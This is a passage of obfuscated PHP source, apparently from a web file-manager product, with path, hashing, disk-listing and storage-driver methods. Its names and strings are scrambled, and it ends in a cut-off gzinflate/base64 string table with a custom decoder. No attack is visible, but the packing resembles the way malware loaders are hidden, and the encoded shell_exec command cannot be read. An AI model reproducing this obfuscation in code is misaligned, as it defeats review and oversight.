str_replace($‹‚ºç¨×[1416], $‹‚ºç¨×[8], $É²Ò™ˆ¥); if (strpos($É²Ò™ˆ¥, $‹‚ºç¨×[87]) > 0) { $É²Ò™ˆ¥ = substr($É²Ò™ˆ¥, 0, strpos($É²Ò™ˆ¥, $‹‚ºç¨×[87])); } if (strpos($É²Ò™ˆ¥, $‹‚ºç¨×[1419]) > 0) { $É²Ò™ˆ¥ = substr($É²Ò™ˆ¥, 0, strpos($É²Ò™ˆ¥, $‹‚ºç¨×[1419])); } return $É²Ò™ˆ¥; } public static function sourceID($Ëù–Ìå®) { $Àì™ã«® =& $_SERVER[¤øïŠ‹²]; $«ãªïŒÀ = self::parse($Ëù–Ìå®); if ($«ãªïŒÀ[$Àì™ã«®[33]] !== self::KOD_SOURCE) { show_json(LNG($Àì™ã«®[1420]), !1); } return $«ãªïŒÀ[$Àì™ã«®[493]]; } public static function make($„Ğì©î) { if (!$„Ğì©î) { return !1; } return self::makePath(self::KOD_SOURCE, intval($„Ğì©î)); } public static function makeShare($«©”¦º, $“™¯Ûã¹) { return self::makePath(self::KOD_SHARE_ITEM, $«©”¦º, $“™¯Ûã¹); } public static function makeFileTypePath($†’ §äğ) { return self::makePath(self::KOD_USER_FILE_TYPE, $†’ §äğ); } public static function makeFileTagPath($‹À¶‚¶) { return self::makePath(self::KOD_USER_FILE_TAG, $‹À¶‚¶); } public static function makePath($ˆ™Íé›¡, $ı³ÉÈÒù = '', $É¾š‰˜ğ = '') { $¿óÖ§Ç¤ =& $_SERVER[¤øïŠ‹²]; $ÊÂƒŸÎ = substr($ˆ™Íé›¡, 1, -1); $ÁÏº¸ø = $¿óÖ§Ç¤[1421] . $ÊÂƒŸÎ . $¿óÖ§Ç¤[1422] . $ı³ÉÈÒù . $¿óÖ§Ç¤[1423]; $ÁÏº¸ø = $É¾š‰˜ğ ? $ÁÏº¸ø . $É¾š‰˜ğ . $¿óÖ§Ç¤[8] : $ÁÏº¸ø; return $ÁÏº¸ø; } public static function hashPath($ˆÒ ÄÒË, $ÃÅÇÃ§Î = false) { $¥ÒöãËØ =& $_SERVER[¤øïŠ‹²]; if (!$ˆÒ ÄÒË) { return $¥ÒöãËØ[12]; } $³¯î¦ê™ = is_array($ˆÒ ÄÒË) ? $ˆÒ ÄÒË : IO::info($ˆÒ ÄÒË); $ãè„„Ôœ = _get($³¯î¦ê™, $¥ÒöãËØ[1424], $¥ÒöãËØ[12]); if (!$ãè„„Ôœ && isset($³¯î¦ê™[$¥ÒöãËØ[563]])) { $ãè„„Ôœ = $³¯î¦ê™[$¥ÒöãËØ[563]]; } if (!$ãè„„Ôœ && isset($³¯î¦ê™[$¥ÒöãËØ[248]])) { $ãè„„Ôœ = trim($³¯î¦ê™[$¥ÒöãËØ[248]], $¥ÒöãËØ[130]); } if ($ãè„„Ôœ) { return $ãè„„Ôœ; } if (!$ãè„„Ôœ && isset($³¯î¦ê™[$¥ÒöãËØ[204]]) && $³¯î¦ê™[$¥ÒöãËØ[204]]) { $³¯î¦ê™ = IO::info(KodIO::make($³¯î¦ê™[$¥ÒöãËØ[204]])); $ãè„„Ôœ = _get($³¯î¦ê™, $¥ÒöãËØ[1424], $¥ÒöãËØ[12]); if (!$ãè„„Ôœ && isset($³¯î¦ê™[$¥ÒöãËØ[563]])) { $ãè„„Ôœ = $³¯î¦ê™[$¥ÒöãËØ[563]]; } } $Œ½Ê³± = md5($³¯î¦ê™[$¥ÒöãËØ[98]] . $³¯î¦ê™[$¥ÒöãËØ[90]] . $³¯î¦ê™[$¥ÒöãËØ[99]]); $À¶µòû = $Œ½Ê³± . $¥ÒöãËØ[1425]; $ãè„„Ôœ = $ãè„„Ôœ ? $ãè„„Ôœ : Cache::get($À¶µòû); if (!$ãè„„Ôœ && $ÃÅÇÃ§Î) { $ãè„„Ôœ = IO::hashSimple($³¯î¦ê™[$¥ÒöãËØ[98]]); Cache::set($À¶µòû, $ãè„„Ôœ ? $ãè„„Ôœ : $Œ½Ê³±, 3600 * 24 * 30); } return $ãè„„Ôœ ? $ãè„„Ôœ : $Œ½Ê³±; } public static function hashPathSafe($‰ùäƒ€Î, $¤ë£°óÀ = false) { $º“¤Å¤Õ =& $_SERVER[¤øïŠ‹²]; $¶¦Î›’Ô = self::hashPath($‰ùäƒ€Î, $¤ë£°óÀ); return md5($¶¦Î›’Ô . $º“¤Å¤Õ[1426] . Model($º“¤Å¤Õ[874])->get($º“¤Å¤Õ[875])); } public static function initSystemPath() { $Á¢ã½² =& $_SERVER[¤øïŠ‹²]; if (defined($Á¢ã½²[1427])) { return; } define($Á¢ã½²[1427], self::systemPath($Á¢ã½²[202])); define($Á¢ã½²[1428], self::systemPath($Á¢ã½²[1429])); define($Á¢ã½²[1430], self::systemPath($Á¢ã½²[1431])); define($Á¢ã½²[1432], self::systemPath($Á¢ã½²[1433])); IOHistory::bindEvent(); } public static function systemPath($Ğ²åòíÎ) { $ŒÊÏÊ =& $_SERVER[¤øïŠ‹²]; $ëÈÀíû« = $ŒÊÏÊ[1434] . ucfirst($Ğ²åòíÎ); $Ş”æñ¥· = Model($ŒÊÏÊ[874])->get($ëÈÀíû«); if ($Ş”æñ¥·) { return $Ş”æñ¥·; } if ($Ğ²åòíÎ == $ŒÊÏÊ[202]) { $Ş”æñ¥· = self::make(Model($ŒÊÏÊ[934])->systemRootPathAdd($ŒÊÏÊ[634])); } else { $Ş”æñ¥· = self::systemPath($ŒÊÏÊ[202]); $Ó“Ûè›Ñ = self::sourceID($Ş”æñ¥·); $Ş”æñ¥· = self::make(Model($ŒÊÏÊ[934])->mkdir($Ó“Ûè›Ñ, $Ğ²åòíÎ)); } Model($ŒÊÏÊ[874])->set($ëÈÀíû«, $Ş”æñ¥·); return $Ş”æñ¥·; } public static function systemFolder($„¿ßÇÍ) { $Â´”¦«ô = IO_PATH_SYSTEM_SOURCE . $„¿ßÇÍ; $äËØŒÂ = Cache::get($Â´”¦«ô); if (!$äËØŒÂ) { $ö—„Ô×› = IO::infoFullSimple($Â´”¦«ô); if (!$ö—„Ô×›) { $äËØŒÂ = IO::mkdir($Â´”¦«ô, REPEAT_SKIP); } else { $äËØŒÂ = $ö—„Ô×›[$_SERVER[¤øïŠ‹²][98]]; } Cache::set($Â´”¦«ô, $äËØŒÂ, 3600 * 10); } return $äËØŒÂ; } public static function defaultDriver() { return Model($_SERVER[¤øïŠ‹²][869])->defaultDriver(); } public static function defaultDriverInit() { $¬ÆÀœ¹³ =& $_SERVER[¤øïŠ‹²]; static $¯±àôØş = false; if ($¯±àôØş) { return $¯±àôØş; } $Ã‡Å‘Î‰ = self::defaultDriver(); $¯±àôØş = IO::init($¬ÆÀœ¹³[1435] . $Ã‡Å‘Î‰[$¬ÆÀœ¹³[493]] . $¬ÆÀœ¹³[1423]); return $¯±àôØş; } public static function fileTypeList() { $²ÕÆ‘ıÌ =& $_SERVER[¤øïŠ‹²]; $û”àÂ´ı = $GLOBALS[$²ÕÆ‘ıÌ[6]][$²ÕÆ‘ıÌ[1436]]; foreach ($û”àÂ´ı as $õçüÒüÎ => $ÔÏÇµÖã) { $éÕÏ¥ÉÃ = $²ÕÆ‘ıÌ[1437] . $õçüÒüÎ; $©Ú³È²ş = LNG($éÕÏ¥ÉÃ); if ($éÕÏ¥ÉÃ != $©Ú³È²ş) { $û”àÂ´ı[$õçüÒüÎ][$²ÕÆ‘ıÌ[32]] = $©Ú³È²ş; } } return $û”àÂ´ı; } public static function ioFileDriverGet($ÁßîèÖş = '') { $Şí´Æò =& $_SERVER[¤øïŠ‹²]; static $¥¦›ÕíÕ = array(); static $œ÷µ¹Ê = array(); static $­—¾Şß¼ = array(); static $¸–ŞƒÎö = false; if ($¸–ŞƒÎö === !1) { $¸–ŞƒÎö = array($Şí´Æò[604] => array(), $Şí´Æò[691] => array()); $Äƒ²íó = Model($Şí´Æò[1438])->get(!1, $Şí´Æò[1439]); foreach ($Äƒ²íó as $£‡‡ã¬ => $·æ†â©ê) { if (!$·æ†â©ê || $·æ†â©ê == $Şí´Æò[12]) { continue; } if (strstr($£‡‡ã¬, $Şí´Æò[1440])) { $îøµ”ô = str_replace($Şí´Æò[1440], $Şí´Æò[12], $£‡‡ã¬); $¸–ŞƒÎö[$Şí´Æò[604]][$îøµ”ô] = $·æ†â©ê; } else { if (strstr($£‡‡ã¬, $Şí´Æò[1441])) { $îøµ”ô = str_replace($Şí´Æò[1441], $Şí´Æò[12], $£‡‡ã¬); $¸–ŞƒÎö[$Şí´Æò[691]][$îøµ”ô] = $·æ†â©ê; } } } } $âòÑäÇş = self::defaultDriver(); if (!$ÁßîèÖş || !$¸–ŞƒÎö[$Şí´Æò[604]] && !$¸–ŞƒÎö[$Şí´Æò[691]]) { return $âòÑäÇş; } $Ó•Úşâ£ = self::getPathSourceID($ÁßîèÖş); if (!$Ó•Úşâ£) { return $âòÑäÇş; } if (isset($¥¦›ÕíÕ[$Ó•Úşâ£])) { return $¥¦›ÕíÕ[$Ó•Úşâ£]; } $ƒçšıæì = Model($Şí´Æò[934])->sourceInfo($Ó•Úşâ£); $•Ş»åıÍ = $ƒçšıæì[$Şí´Æò[595]]; $‡Æîò™á = array(); if (!$ƒçšıæì) { return $âòÑäÇş; } if ($ƒçšıæì[$Şí´Æò[201]] == $Şí´Æò[102]) { if (isset($­—¾Şß¼[$•Ş»åıÍ])) { return $­—¾Şß¼[$•Ş»åıÍ]; } if (isset($¸–ŞƒÎö[$Şí´Æò[691]][$•Ş»åıÍ])) { $Ñ«ø°å = Model($Şí´Æò[869])->driverInfo($¸–ŞƒÎö[$Şí´Æò[691]][$•Ş»åıÍ]); $âòÑäÇş = $Ñ«ø°å ? $Ñ«ø°å : $âòÑäÇş; $­—¾Şß¼[$•Ş»åıÍ] = $âòÑäÇş; $¥¦›ÕíÕ[$Ó•Úşâ£] = $âòÑäÇş; return $âòÑäÇş; } $‡Æîò™á = self::groupParentUser($•Ş»åıÍ); } else { if ($ƒçšıæì[$Şí´Æò[201]] == $Şí´Æò[530]) { $°š¼»² = Model($Şí´Æò[1442])->getInfo($•Ş»åıÍ); if ($°š¼»²) { $‡Æîò™á = explode($Şí´Æò[50], trim($°š¼»²[$Şí´Æò[610]], $Şí´Æò[50])); $‡Æîò™á = array_remove_value($‡Æîò™á, $Şí´Æò[241]); $‡Æîò™á[] = $•Ş»åıÍ; $‡Æîò™á = array_reverse($‡Æîò™á); } } } foreach ($‡Æîò™á as $ÄÛÀ¯Ì) { if (!isset($¸–ŞƒÎö[$Şí´Æò[604]][$ÄÛÀ¯Ì])) { continue; } if (isset($œ÷µ¹Ê[$ÄÛÀ¯Ì])) { return $œ÷µ¹Ê[$ÄÛÀ¯Ì]; } $Ñ«ø°å = Model($Şí´Æò[869])->driverInfo($¸–ŞƒÎö[$Şí´Æò[604]][$ÄÛÀ¯Ì]); $âòÑäÇş = $Ñ«ø°å ? $Ñ«ø°å : $âòÑäÇş; $œ÷µ¹Ê[$ÄÛÀ¯Ì] = $âòÑäÇş; break; } if ($ƒçšıæì[$Şí´Æò[201]] == $Şí´Æò[102]) { $­—¾Şß¼[$•Ş»åıÍ] = $âòÑäÇş; } $¥¦›ÕíÕ[$Ó•Úşâ£] = $âòÑäÇş; return $âòÑäÇş; } private static function getPathSourceID($å …è¢Â) { $ß«ç‚¯‹ =& $_SERVER[¤øïŠ‹²]; static $»ÀÎÒª = array(); if (!$å …è¢Â) { return $ß«ç‚¯‹[12]; } $Ôìä¸±œ = substr($å …è¢Â, 0, strlen($ß«ç‚¯‹[504])) == $ß«ç‚¯‹[504]; $×·õö§È = substr($å …è¢Â, 0, strlen($ß«ç‚¯‹[1409])) == $ß«ç‚¯‹[1409]; $àñà‹çŸ = substr($å …è¢Â, 0, strlen($ß«ç‚¯‹[1410])) == $ß«ç‚¯‹[1410]; if (!$Ôìä¸±œ && !$×·õö§È && !$àñà‹çŸ) { return $ß«ç‚¯‹[12]; } $¢½ÉŸ¸î = self::parse($å …è¢Â); $ß•ŒÒàÎ = $¢½ÉŸ¸î[$ß«ç‚¯‹[1303]]; if ($Ôìä¸±œ) { return $¢½ÉŸ¸î[$ß«ç‚¯‹[493]]; } if (isset($»ÀÎÒª[$ß•ŒÒàÎ])) { $¥õ„øùÃ = $»ÀÎÒª[$ß•ŒÒàÎ]; } else { $¥õ„øùÃ = IO::init($ß•ŒÒàÎ); $»ÀÎÒª[$ß•ŒÒàÎ] = $¥õ„øùÃ; } if (isset($¥õ„øùÃ->pathParse[$ß«ç‚¯‹[1306]])) { return $¥õ„øùÃ->pathParse[$ß«ç‚¯‹[1306]]; } return $ß«ç‚¯‹[12]; } private static function groupParentUser($ŸãŸì¡ ) { $„ÚÕ‚Ì¾ =& $_SERVER[¤øïŠ‹²]; $‚›€Ì‡Ÿ = Model($„ÚÕ‚Ì¾[623])->getInfo($ŸãŸì¡ ); if (!$‚›€Ì‡Ÿ) { return array(); } $ÑöÌ¦Ø = array_to_keyvalue($‚›€Ì‡Ÿ[$„ÚÕ‚Ì¾[1443]], $„ÚÕ‚Ì¾[12], $„ÚÕ‚Ì¾[1444]); $š·çğç¿ = array(); foreach ($‚›€Ì‡Ÿ[$„ÚÕ‚Ì¾[1443]] as $öÃÁà”) { $š·çğç¿[] = $öÃÁà”[$„ÚÕ‚Ì¾[1444]]; $ñ–§¥´å = explode($„ÚÕ‚Ì¾[50], trim($öÃÁà”[$„ÚÕ‚Ì¾[610]], $„ÚÕ‚Ì¾[50])); $ñ–§¥´å = array_remove_value($ñ–§¥´å, $„ÚÕ‚Ì¾[241]); $ñ–§¥´å = array_reverse($ñ–§¥´å); $š·çğç¿ = array_merge($š·çğç¿, $ñ–§¥´å); } return array_unique($š·çğç¿); } public static function diskList($â†½Œôß = true) { $£¶†±È¾ = $_SERVER[¤øïŠ‹²][1445]; if ($â†½Œôß) { $Óø‡ÕäÑ = Cache::get($£¶†±È¾); if (is_array($Óø‡ÕäÑ)) { return $Óø‡ÕäÑ; } } $Óø‡ÕäÑ = self::diskListGet(); Cache::set($£¶†±È¾, $Óø‡ÕäÑ, 60); return $Óø‡ÕäÑ; } public static function diskListGet() { $€”§˜åœ =& $_SERVER[¤øïŠ‹²]; $•İ Â–¿ = array(); if ($GLOBALS[$€”§˜åœ[6]][$€”§˜åœ[1446]] == $€”§˜åœ[1447]) { $ íÜÚÕû = $€”§˜åœ[1448]; for ($¸éÄœÁ… = 0; $¸éÄœÁ… < strlen($ íÜÚÕû); $¸éÄœÁ…++) { $„ğ¸òÂÃ = $ íÜÚÕû[$¸éÄœÁ…] . $€”§˜åœ[1449]; if (file_exists($„ğ¸òÂÃ)) { $•İ Â–¿[] = $„ğ¸òÂÃ; } } return $•İ Â–¿; } if (!function_exists($€”§˜åœ[110])) { $•İ Â–¿[] = $€”§˜åœ[948]; return $•İ Â–¿; } $·ûÜ¶Ü× = explode($€”§˜åœ[59], shell_exec($€”§˜åœ[1450])); array_shift($·ûÜ¶Ü×); array_pop($·ûÜ¶Ü×); $­Ëİ¾òº = array($€”§˜åœ[1451], $€”§˜åœ[1452], $€”§˜åœ[1453], $€”§˜åœ[1454], $€”§˜åœ[1455], $€”§˜åœ[1456], $€”§˜åœ[1457], $€”§˜åœ[1458]); foreach ($·ûÜ¶Ü× as $‚ÎÂ—Ü—) { $€ü—÷€İ = preg_split($€”§˜åœ[1459], $‚ÎÂ—Ü—); $„ğ¸òÂÃ = $€ü—÷€İ[count($€ü—÷€İ) - 1]; if (!strstr($€ü—÷€İ[0], $€”§˜åœ[1460]) || !$„ğ¸òÂÃ) { continue; } $Ë³½æ„Œ = rtrim($„ğ¸òÂÃ, $€”§˜åœ[8]) . $€”§˜åœ[8]; $•İ Â–¿[] = $Ë³½æ„Œ; } return $•İ Â–¿; } public static function isSameDisk($ªãöşÛ, $º‚©ó—¶) { $üƒß®Ğ§ =& $_SERVER[¤øïŠ‹²]; if ($GLOBALS[$üƒß®Ğ§[6]][$üƒß®Ğ§[1446]] == $üƒß®Ğ§[1447]) { return strtolower(substr($ªãöşÛ, 0, 1)) == strtolower(substr($º‚©ó—¶, 0, 1)); } $Ã„æ®Ãí = stat($ªãöşÛ); $·¹Ä±”§ = stat($º‚©ó—¶); if ($Ã„æ®Ãí === !1 || $·¹Ä±”§ === !1) { return !1; } return $Ã„æ®Ãí[$üƒß®Ğ§[1461]] === $·¹Ä±”§[$üƒß®Ğ§[1461]]; $²¯Ç‘èå = self::diskList(); $Ó”•À¾€ = !1; $À·Ê¥ì = !1; sort($²¯Ç‘èå); $²¯Ç‘èå = array_reverse($²¯Ç‘èå); $ªãöşÛ = rtrim($ªãöşÛ, $üƒß®Ğ§[8]) . $üƒß®Ğ§[8]; $º‚©ó—¶ = rtrim($º‚©ó—¶, $üƒß®Ğ§[8]) . $üƒß®Ğ§[8]; foreach ($²¯Ç‘èå as $¯Ò¤‰Ÿö) { $ı¶¼Ë‰ø = strlen($¯Ò¤‰Ÿö); if (!$Ó”•À¾€ && substr($ªãöşÛ, 0, $ı¶¼Ë‰ø) == $¯Ò¤‰Ÿö) { $Ó”•À¾€ = $¯Ò¤‰Ÿö; } if (!$À·Ê¥ì && substr($º‚©ó—¶, 0, $ı¶¼Ë‰ø) == $¯Ò¤‰Ÿö) { $À·Ê¥ì = $¯Ò¤‰Ÿö; } if ($Ó”•À¾€ && $À·Ê¥ì) { break; } } return $Ó”•À¾€ === $À·Ê¥ì; } public static function transferType($Óæé–Ş, $ÅË™é·) { $Ø†İµ£× =& $_SERVER[¤øïŠ‹²]; $ÃÛÖÆƒ€ = self::driverType($Óæé–Ş); $öÔ¦á¹ë = self::driverType($ÅË™é·); if ($ÃÛÖÆƒ€[$Ø†İµ£×[33]] == $öÔ¦á¹ë[$Ø†İµ£×[33]] && $ÃÛÖÆƒ€[$Ø†İµ£×[1462]] == $öÔ¦á¹ë[$Ø†İµ£×[1462]]) { return $Ø†İµ£×[1463]; } if ($ÃÛÖÆƒ€[$Ø†İµ£×[33]] == $Ø†İµ£×[982] && $öÔ¦á¹ë[$Ø†İµ£×[33]] == $Ø†İµ£×[118]) { return $Ø†İµ£×[1331]; } if ($ÃÛÖÆƒ€[$Ø†İµ£×[33]] == $Ø†İµ£×[118] && $öÔ¦á¹ë[$Ø†İµ£×[33]] == $Ø†İµ£×[982]) { return $Ø†İµ£×[119]; } return $Ø†İµ£×[1464]; } public static function driverType($éë¯Òòç) { $´Óİà¹ß =& $_SERVER[¤øïŠ‹²]; $Ì‚ÌèÒ¥ = str_replace($´Óİà¹ß[1465], $´Óİà¹ß[12], strtolower($éë¯Òòç->getType())); if ($Ì‚ÌèÒ¥ == $´Óİà¹ß[859] || $Ì‚ÌèÒ¥ == $´Óİà¹ß[1466] || $Ì‚ÌèÒ¥ == $´Óİà¹ß[1467]) { $åÇá«÷ú = self::ioFileDriverGet($´Óİà¹ß[504] . $éë¯Òòç->pathParse[$´Óİà¹ß[1306]] . $´Óİà¹ß[414]); $éë¯Òòç = IO::init($´Óİà¹ß[1435] . $åÇá«÷ú[$´Óİà¹ß[493]] . $´Óİà¹ß[1423]); } else { if ($Ì‚ÌèÒ¥ == $´Óİà¹ß[1341] || $Ì‚ÌèÒ¥ == $´Óİà¹ß[1468]) { $éë¯Òòç = IO::init($éë¯Òòç->pathParse[$´Óİà¹ß[1283]]); } } $šéê‹˜ = $éë¯Òòç->path; $Ì‚ÌèÒ¥ = str_replace($´Óİà¹ß[1465], $´Óİà¹ß[12], strtolower($éë¯Òòç->getType())); if ($Ì‚ÌèÒ¥ == $´Óİà¹ß[118]) { return array($´Óİà¹ß[33] => $´Óİà¹ß[118], $´Óİà¹ß[1462] => $´Óİà¹ß[12], $´Óİà¹ß[98] => $šéê‹˜, $´Óİà¹ß[107] => $éë¯Òòç); } return array($´Óİà¹ß[33] => $´Óİà¹ß[982], $´Óİà¹ß[1462] => $éë¯Òòç->pathDriver, $´Óİà¹ß[98] => $šéê‹˜, $´Óİà¹ß[107] => $éë¯Òòç); } public static function pathDriverType($öØŞ‘ã¢) { return $öØŞ‘ã¢ ? self::driverType(IO::init($öØŞ‘ã¢)) : !1; } public static function pathDriverLocal($è©»„±) { $ßßŞª¤ =& $_SERVER[¤øïŠ‹²]; $õï«ùí’ = $è©»„± ? self::driverType(IO::init($è©»„±)) : !1; return strtolower($õï«ùí’[$ßßŞª¤[33]]) == $ßßŞª¤[118] ? !0 : !1; } public static function allowCover($‡¾ÍÃŒ©, $ôË¤Ô¨ú = true) { $ÚÑãÄÕ =& $_SERVER[¤øïŠ‹²]; if (is_string($‡¾ÍÃŒ©)) { $‡¾ÍÃŒ© = IO::info($‡¾ÍÃŒ©); } if (!$‡¾ÍÃŒ© || $‡¾ÍÃŒ©[$ÚÑãÄÕ[33]] == $ÚÑãÄÕ[89] || $‡¾ÍÃŒ©[$ÚÑãÄÕ[90]] <= 100) { return !1; } if (isset($‡¾ÍÃŒ©[$ÚÑãÄÕ[1469]]) || !$‡¾ÍÃŒ©[$ÚÑãÄÕ[98]]) { return !1; } if (isset($‡¾ÍÃŒ©[$ÚÑãÄÕ[245]]) && !$‡¾ÍÃŒ©[$ÚÑãÄÕ[245]]) { return !1; } static $Çû‡Ò£Ö = false; if (!$Çû‡Ò£Ö || !$ôË¤Ô¨ú) { $ó›ôÎ† = self::driverType(IO::init($‡¾ÍÃŒ©[$ÚÑãÄÕ[98]])); $ş²Ëò€ = $ó›ôÎ†[$ÚÑãÄÕ[107]]; $Çû‡Ò£Ö = $ÚÑãÄÕ[207]; if ($ó›ôÎ†[$ÚÑãÄÕ[33]] == $ÚÑãÄÕ[118]) { $Çû‡Ò£Ö = $ÚÑãÄÕ[1470]; } if ($ó›ôÎ†[$ÚÑãÄÕ[107]] && is_array($ó›ôÎ†[$ÚÑãÄÕ[107]]->config)) { $“êóƒè³ = $ó›ôÎ†[$ÚÑãÄÕ[107]]->config; if (isset($“êóƒè³[$ÚÑãÄÕ[1471]]) && $“êóƒè³[$ÚÑãÄÕ[1471]]) { $Çû‡Ò£Ö = $ÚÑãÄÕ[1470]; } } $»Ášæ±¹ = KodIO::defaultDriver(); if (strtolower($»Ášæ±¹[$ÚÑãÄÕ[107]]) == $ÚÑãÄÕ[118] && is_array($»Ášæ±¹[$ÚÑãÄÕ[6]])) { $ÊûôÔ¢Á = $»Ášæ±¹[$ÚÑãÄÕ[6]][$ÚÑãÄÕ[1315]]; if (substr($ÊûôÔ¢Á, 0, 2) == $ÚÑãÄÕ[1472]) { $ÊûôÔ¢Á = str_replace($ÚÑãÄÕ[1472], BASIC_PATH, $ÊûôÔ¢Á); } $ÊûôÔ¢Á = str_replace($ÚÑãÄÕ[267], $ÚÑãÄÕ[8], $ÊûôÔ¢Á); if (substr($‡¾ÍÃŒ©[$ÚÑãÄÕ[98]], 0, strlen($ÊûôÔ¢Á)) == $ÊûôÔ¢Á) { $Çû‡Ò£Ö = $ÚÑãÄÕ[207]; } } } return $Çû‡Ò£Ö == $ÚÑãÄÕ[1470] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($‡Ÿ…´šÚ) { parent::__construct($‡Ÿ…´šÚ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto FÔŠç¦åÆ; A÷Ïñƒ ‡²: define($_SERVER[¤øïŠ‹²][330], 1); define($_SERVER[¤øïŠ‹²][331], 0); define($_SERVER[¤øïŠ‹²][332], 2); goto bÆŞ¶‹ÌÄ; e×™µƒÂç : if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(strrev('²‹Šïø¤'), "\312\262\362\324\257\351"); $_SERVER[¤øïŠ‹²] = explode("\174\1\174\3\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\171\174\33\305\365\0\136\216\162\244\264\120\150\201\226\36\213\41\261\235\350\260\235\204\44\216\235\40\313\162\54\42\133\216\44\347\300\66\233\225\264\226\66"."\x96\xb4\xb2\x76\xe5\x2b\x9\x10\x20\x50\x8\xe1\xa6\x14\xbe\x9c\xa5\x14\x5a\x9a\x8b\x33\x10\xae\x2\x3d\x28\xb4\xa5\xf7\x41\xb9\x63\x27\x14\x28\xa5\x7c\xdb\x72\x95\xfe\xe6\x78\x73\xec\x4a\x86\xef\xef\xf3\xfb\xe3\x97\x4f"."\22\355\334\63\157\336\274\171\363\346\275\67\267\274\360\352\275\77\335\272\341\200\15\7\155\70\340\234\127\277\361\277\167\336\116\277\67\34\214\376\377\64\375\376\372\226\303\76\105\376\34\263\345\242\272".base64_decode('us5TZszpPuLSe7Zp39O2a1ujkaefCX/2Fz84LTR169PjUwd86tSLlqaaUWZatpn+KAXTVvQxww==')."\xb2\x2d\x1a\x91\x32\xb\x83\x46\x86\x7e\x1b\x5\xfa\xeb\xa7\x3f\xbd\xb1\x48\x49\xcf\x9b\xb6\x4e\x83\x3e\xfa\xa3\x42\xbf\xc8\xff\xd6\x70\xce\x60\xe9\x6a\x77\x34\xa1\xc6\x7b\x7b\x7a\x42\xb1\x4\x64\x6a\x96\xd3\xf3\x66\x1a"."\xbe\x8a\x5a\x49\xcb\x43\xfb\x45\xbd\x64\xa1\xde\xc8\xd5\xa9\x45\xb3\xa8\x17\x1c\x31\x22\x22\xad\xd9\x5a\x52\xb3\xa0\xa6\xf6\x36\xb5\x3d\xd4\x13\x89\xae\x51\x13\x6b\x7a\x42\x90\x23\xa9\xe\x97\xf5\xd2\x38\xd\x91\xcf\xb8".base64_decode('rZXshJHXeY7REu9XW2hZuFtJxALd8UAwEY520+hgtKsrnKiMj0UjkbZAcHllSk8ssKwroKD+5Q==')."\x74\xd5\x28\xc\x9a\x75\xca\x5a\x9a\xb2\x56\xa9\xa7\x1f\x1d\x86\x9e\x4b\xd3\xcf\x82\xc6\xba\x63\x8f\x17\xe1\x2b\xc1\xbf\xd0\x34\x15\xca\xb9\x1c\xd\x74\xf3\xaf\xb4\x3e\xa8\x95\x73\x0\xad\x76\x39\x50\x2c\x19\x79\x8d\xd"."\172\271\76\316\143\351\207\126\266\115\243\220\242\201\320\230\135\322\104\74\352\153\12\115\264\136\200\252\342\241\110\50\230\120\160\7\225\216\130\264\113\201\111\310\153\226\255\227\224\125\235\241\130\110\301".base64_decode('nW6tJWOtVQBfuhEolEAkokxXg63ni6waWqZKZdFYeyimtK1RBIRSZj5vFnyoFjSTttTVUCxGPw==').strrev('~‹¨è\'µAÃÄm$Z…–Š¶èÍKøß¡Apô&7œÕ,!â:;D40‘Ş€<')."\53\75\144\371\265\122\52\153\214\350\21\43\351\117\32\5\77\106\116\137\222\55\243\31\364\147\36\214\41\253\247\206\124\55\151\226\154\35\120\240\134\310\31\205\41\171\75\305\127\104\20\234\346\302\352"."\x71\x84\xd2\x83\x39\x5b\x1d\xd1\x72\x65\xb6\x88\xa0\x60\x2d\xfc\xd4\xba\xc7\x47\xc3\xa6\x5\x63\x18\x36\xa\x46\x19\x16\x15\x54\x69\x9a\x9c\x8\xc0\x47\x99\xe5\xd6\x59\x8c\x9e\x86\x8f\x3c\x2a\x6f\x42\xb9\x24\xc4\x25\x59".strrev('—œ»®‹o³K™…LÌ%í³³G«'."\n".'YÕ'."\0".'(ÚfRª¶KÑ@ÄŸ(bïèK­Ÿ¡€@Ãìu®')."\xb3\xf0\x20\x9a\x8a\x5c\xba\xc4\x8\xc5\xc7\xe5\xa4\xc1\x8\xa7\x3b\x38\xaf\x8\x15\x51\x4f\x38\xc9\x32\x6\xc7\x5\xe1\xc0\xf9\x7a\x78\xaa\x65\x96\x4b\x29\x84\x46\x83\x0\x96\x46\x88\xd6\x6d\x1b\xd\x8e\x1\xc4\xec\x2d"."\346\114\55\35\327\113\174\150\206\331\201\52\212\226\155\71\162\210\255\331\264\4\4\177\135\337\46\357\107\3\175\247\242\377\352\201\54\367\103\63\131\75\227\123\365\61\35\26\165\76\75\337\142\343\363"."\x5b\x18\x1b\x51\xc\xd\x86\xa3\x6a\x56\xb3\xb2\x5d\xe9\xf9\x2a\x29\xc5\xa8\x7d\x5a\x1f\xf3\x15\xb3\x45\xa0\x38\x9c\xc8\xf4\x3b\x16\x1d\x86\x46\xb7\x69\x87\xa4\x3d\x23\x67\xa6\x34\xc8\x5b\x26\x83\xa3\xdf\x59\xdb\x2e\xc6".base64_decode('9UK6gy+ntDlaIIMv6gzn2z1KWulS1iidzUazxQrmc/yLjY7HWTzSHmMzlB4EBGRrrQYaNCxCfQ==').base64_decode('BelASzVnpDTbMAt+M2XrtteyS7oGNQZSKd2yvEG02ktmzhvI5cxRb7RkZIxCszIbNgJKCryYOA==')."\x37\x3\x15\xa9\x59\xac\x60\x5c\xc0\xcd\xcc\x6e\x2d\xdb\x83\xde\x85\x6c\xfd\x25\x4a\x5a\xc1\x1a\xd4\x4b\xde\x10\x20\x79\xb3\x82\x3a\xc9\x29\x33\xaf\xec\xff\x96\xad\xdd\xb0\x8a\xa6\x65\xe0\xde\x37\x2b\x9a\x6d\x6b\xa9\x2c"."\x26\x7e\xa2\xf5\xd6\x8f\xc9\x6f\x60\xf2\xa2\x57\xe6\x45\x95\xe8\xde\x9e\x92\x96\xc9\x6b\xcd\x4a\xb1\x9c\x44\xf0\x81\x25\x8\x71\x29\x9c\x43\xce\xc\xf0\x69\x56\xf2\xda\x98\x57\xcb\xb0\x9a\x42\x63\x45\xa3\xa4\x5b\xc\x28".base64_decode('yrKuBCDcoLcLLx1DT3vjaHeByuY2zFMQKiksjcZ2